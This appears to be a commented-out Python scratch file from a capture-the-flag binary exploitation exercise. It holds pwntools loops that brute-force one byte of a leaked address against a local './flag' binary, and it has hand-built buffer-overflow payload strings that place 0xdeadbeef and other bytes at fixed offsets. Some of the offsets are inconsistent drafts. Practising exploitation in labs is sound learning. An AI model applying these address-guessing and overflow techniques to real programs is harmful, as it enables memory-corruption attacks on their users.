# from pwn import *
# for i in range(256):  # trying all possibilities for the remaining byte
#     p = process('./flag')
#     leaked_address = p.recvuntil(b'7f796cc50000')  # get leaked address
#     leaked_address = leaked_address.decode().split('\n')[1]
#     leaked_address = int(leaked_address, 16)
#     payload = hex(leaked_address + i)[2:]  # add guessed byte to leaked_address and convert to string
#     p.sendline(payload)
#     response = p.recvall()  # receive all output
#     if b'call_me' in response:  # check if 'call_me' is in the response
#         print(f'Success with payload: {payload}')
#         break
#     p.close()


# from pwn import *
# import time

# for i in range(256):  # trying all possibilities for the remaining byte
#     p = process('./flag')
#     output = p.recvuntil(b'7f796cc50000')  # get output until newline
#     leaked_address_line = output.decode().split('\n')[1]  # split output and get the line with the leaked address
#     leaked_address = leaked_address_line.split(' ')[0]  # split line and get only the leaked address
#     leaked_address = int(leaked_address, 16)  # convert address from string to integer
#     payload = hex(leaked_address + i)[2:]  # add guessed byte to leaked_address and convert to string
#     p.sendline(payload.encode())  # send payload (must be bytes, so we encode the string)
#     time.sleep(1)  # allow some time for the process to respond
#     response = p.recvall(timeout=1)  # receive all output (add a timeout to prevent hanging)
#     if b'call_me' in response:  # check if 'call_me' is in the response
#         print(f'Success with payload: {payload}')
#         break
#     p.close()
# payload = 'A' * 420  # Create an initial payload filled with 'A'
# payload = payload[:201] + '\xef\xbe\xad\xde' + payload[201+4:]  # Insert 0xdeadbeef at the correct positions

# print(payload)

# payload = 'A' * 420
# payload = payload[:200] +'1' + payload[201:2016] + '1' + payload[2017:]
# print(payload)

#payload = 'A' * 420  # Create an initial payload filled with 'A'
# how to change the 203th byte to \023 and the 205th byte to \025 and the 201th byte to 1 and the 207th byte to 1
# payload = 'A' * 240
# payload = payload[:201] + '1' + payload[202:203] + '\025' + payload[204:205] + '\025' + payload[206:207] + '1' + payload[208:]
# print(payload)

# Path: 02_bad_rando.py





